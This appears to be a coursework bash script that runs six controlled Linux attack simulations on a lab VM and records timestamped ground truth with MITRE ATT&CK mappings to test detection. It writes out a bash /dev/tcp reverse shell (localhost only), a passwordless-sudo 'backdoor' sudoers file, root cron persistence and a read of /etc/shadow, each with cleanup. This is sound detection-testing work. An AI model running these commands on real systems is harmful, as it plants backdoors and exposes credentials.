#!/bin/bash
# Name: 11-linux_attack_sim.sh
# Purpose: Run six controlled Linux attack simulations and record UTC ground truth.
# Author: Suraya
# Project: MedDefense - Eyes on the Endpoint (2x02), Task 11
# Run: sudo ./11-linux_attack_sim.sh (on the dedicated Linux lab VM only)

set -uo pipefail

USER_NAME='testattacker'
SUDOERS_FILE='/etc/sudoers.d/backdoor'
TEST_BINARY='/tmp/suspicious_bin'
CRON_FILE='/etc/cron.d/persistence_test'
BEACON_FILE='/tmp/beacon.sh'
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT_FILE="$SCRIPT_DIR/linux_attack_log.json"

user_created=0
sudoers_created=0
binary_created=0
cron_created=0
beacon_created=0
cleaned=0
cleanup_ok=1
action_rows=()
success_count=0

utc_now() {
    date -u '+%Y-%m-%dT%H:%M:%S.%3NZ'
}

# Escape text before inserting it into JSON without requiring jq.
json_string() {
    local value="$1"
    value="${value//\\/\\\\}"
    value="${value//\"/\\\"}"
    value="${value//$'\n'/\\n}"
    value="${value//$'\r'/\\r}"
    value="${value//$'\t'/\\t}"
    printf '"%s"' "$value"
}

cleanup_artifacts() {
    if (( cleaned == 1 )); then
        return 0
    fi
    cleaned=1
    cleanup_ok=1

    # Remove the privileged configuration before removing the test account.
    if (( cron_created )); then
        rm -f -- "$CRON_FILE" || cleanup_ok=0
    fi
    if (( sudoers_created )); then
        rm -f -- "$SUDOERS_FILE" || cleanup_ok=0
    fi
    if (( beacon_created )); then
        rm -f -- "$BEACON_FILE" || cleanup_ok=0
    fi
    if (( binary_created )); then
        rm -f -- "$TEST_BINARY" || cleanup_ok=0
    fi
    if (( user_created )); then
        userdel "$USER_NAME" >/dev/null 2>&1 || cleanup_ok=0
    fi
    (( cleanup_ok == 1 ))
}

on_exit() {
    cleanup_artifacts || true
}
trap on_exit EXIT

if (( EUID != 0 )); then
    echo '[!] Run as root: sudo ./11-linux_attack_sim.sh' >&2
    exit 1
fi

for required in useradd userdel date cp id timeout cat rm; do
    if ! command -v "$required" >/dev/null 2>&1; then
        echo "[!] Missing required command: $required" >&2
        exit 1
    fi
done

if [[ ! -d /etc/sudoers.d || ! -d /etc/cron.d ]]; then
    echo '[!] Missing /etc/sudoers.d or /etc/cron.d; use the prepared lab VM.' >&2
    exit 1
fi

# Never overwrite existing accounts or files, even if they have the test names.
if id "$USER_NAME" >/dev/null 2>&1; then
    echo "[!] Account $USER_NAME already exists; refusing to modify it." >&2
    exit 1
fi
for path in "$SUDOERS_FILE" "$TEST_BINARY" "$CRON_FILE" "$BEACON_FILE"; do
    if [[ -e "$path" || -L "$path" ]]; then
        echo "[!] Existing artifact at $path; refusing to overwrite it." >&2
        exit 1
    fi
done

# Store the same core field names used by the Windows ground truth from Task 9.
record_action() {
    local number="$1" description="$2" started="$3" completed="$4"
    local command_text="$5" source_a="$6" source_b="$7"
    local mitre_id="$8" technique="$9" status="${10}" error_text="${11}"
    local sources_json row

    sources_json="[$(json_string "$source_a")"
    if [[ -n "$source_b" ]]; then
        sources_json+=", $(json_string "$source_b")"
    fi
    sources_json+=']'

    printf -v row '{"action_number":%s,"description":%s,"timestamp":%s,"completed_at_utc":%s,"hostname":%s,"command":%s,"status":%s,"expected_detection_source":%s,"mitre_attack_id":%s,"mitre_attack_technique":%s,"error":%s}' \
        "$number" "$(json_string "$description")" "$(json_string "$started")" \
        "$(json_string "$completed")" "$(json_string "$(hostname)")" \
        "$(json_string "$command_text")" "$(json_string "$status")" \
        "$sources_json" "$(json_string "$mitre_id")" \
        "$(json_string "$technique")" "$(json_string "$error_text")"
    action_rows+=("$row")
}

# Every action gets a timestamp before it runs and its outcome in the JSON.
run_action() {
    local number="$1" label="$2" command_text="$3" source_a="$4"
    local source_b="$5" mitre_id="$6" technique="$7" function_name="$8"
    local started completed status error_text=''

    started="$(utc_now)"
    printf '    [%s/6] %-43s %s\n' "$number" "$label..." "$started"

    if "$function_name"; then
        status='SUCCESS'
        success_count=$((success_count + 1))
    else
        status='FAILED'
        error_text="Action $number failed; review the lab system and permissions."
        echo "        [FAILED] $label" >&2
    fi

    completed="$(utc_now)"
    record_action "$number" "$label" "$started" "$completed" "$command_text" \
        "$source_a" "$source_b" "$mitre_id" "$technique" "$status" "$error_text"
}

create_user() {
    # No password, home directory or interactive login: this is only an audit marker.
    if useradd --no-create-home --shell /usr/sbin/nologin "$USER_NAME"; then
        user_created=1
        return 0
    fi
    return 1
}

modify_sudoers() {
    if (( user_created == 0 )); then
        return 1
    fi
    if printf '%s\n' 'testattacker ALL=(ALL) NOPASSWD:ALL' > "$SUDOERS_FILE"; then
        sudoers_created=1
        chmod 0440 "$SUDOERS_FILE" || return 1
        if command -v visudo >/dev/null 2>&1; then
            visudo -cf "$SUDOERS_FILE" >/dev/null 2>&1 || return 1
        fi
        return 0
    fi
    return 1
}

run_tmp_binary() {
    cp /usr/bin/id "$TEST_BINARY" || return 1
    binary_created=1
    chmod 0700 "$TEST_BINARY" || return 1
    "$TEST_BINARY" >/dev/null
}

localhost_shell_attempt() {
    # Only 127.0.0.1; timeout stops a shell even if a local listener exists.
    # Connection refused is an expected result of this ATTEMPT, not a test failure.
    timeout -k 1s 2s bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' \
        </dev/null >/dev/null 2>&1 || true
    return 0
}

create_cron_entry() {
    # The cron target does nothing. No real beacon or persistence remains afterward.
    if printf '#!/bin/bash\nexit 0\n' > "$BEACON_FILE"; then
        beacon_created=1
        chmod 0700 "$BEACON_FILE" || return 1
    else
        return 1
    fi

    # /etc/cron.d requires an explicit user field (root).
    if printf '* * * * * root /tmp/beacon.sh\n' > "$CRON_FILE"; then
        cron_created=1
        chmod 0644 "$CRON_FILE" || return 1
        return 0
    fi
    return 1
}

read_shadow() {
    cat /etc/shadow > /dev/null
}

save_ground_truth() {
    local temp_output i suffix
    temp_output="$(mktemp "$SCRIPT_DIR/.linux_attack_log.XXXXXX")" || return 1

    {
        printf '[\n'
        for (( i=0; i<${#action_rows[@]}; i++ )); do
            suffix=','
            if (( i == ${#action_rows[@]} - 1 )); then
                suffix=''
            fi
            printf '  %s%s\n' "${action_rows[i]}" "$suffix"
        done
        printf ']\n'
    } > "$temp_output" || { rm -f -- "$temp_output"; return 1; }

    mv -f -- "$temp_output" "$OUTPUT_FILE" || return 1
    if [[ -n "${SUDO_UID:-}" && -n "${SUDO_GID:-}" ]]; then
        chown "$SUDO_UID:$SUDO_GID" "$OUTPUT_FILE" || true
    fi
}

printf '[*] Running Linux attacker simulation...\n'
run_action 1 'Creating user testattacker' \
    'useradd --no-create-home --shell /usr/sbin/nologin testattacker' \
    'auth.log' 'auditd: process_exec' 'T1136.001' 'Create Account: Local Account' create_user

run_action 2 'Modifying sudoers' \
    "printf 'testattacker ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor" \
    'auditd: sudoers' 'auditd: process_exec' 'T1548.003' 'Abuse Elevation Control Mechanism: Sudo and Sudo Caching' modify_sudoers

run_action 3 'Executing from /tmp' \
    'cp /usr/bin/id /tmp/suspicious_bin && /tmp/suspicious_bin' \
    'auditd: process_exec' '' 'T1059.004' 'Command and Scripting Interpreter: Unix Shell' run_tmp_binary

run_action 4 'Reverse shell attempt (localhost only)' \
    "timeout 2s bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" \
    'auditd: network_connect' 'auditd: process_exec' 'T1059.004' 'Command and Scripting Interpreter: Unix Shell' localhost_shell_attempt

run_action 5 'Cron persistence' \
    "printf '* * * * * root /tmp/beacon.sh' > /etc/cron.d/persistence_test" \
    'auditd: cron_persist' 'auditd: process_exec' 'T1053.003' 'Scheduled Task/Job: Cron' create_cron_entry

run_action 6 'Accessing /etc/shadow' \
    'cat /etc/shadow > /dev/null' \
    'auditd: process_exec' 'auditd: shadow watch (if read auditing enabled)' \
    'T1003.008' 'OS Credential Dumping: /etc/passwd and /etc/shadow' read_shadow

printf '[*] Cleaning up artifacts... '
if cleanup_artifacts; then
    printf '[CLEAN]\n'
else
    printf '[INCOMPLETE] Review temporary account/files.\n' >&2
fi

if ! save_ground_truth; then
    echo '[!] Failed to write linux_attack_log.json' >&2
    exit 1
fi
printf 'Actions executed: %s/6\n' "$success_count"
printf 'Ground truth saved to: %s\n' "$OUTPUT_FILE"

if (( success_count != 6 || cleanup_ok != 1 )); then
    echo '[!] Review the ground truth statuses and any incomplete cleanup.' >&2
    exit 1
fi
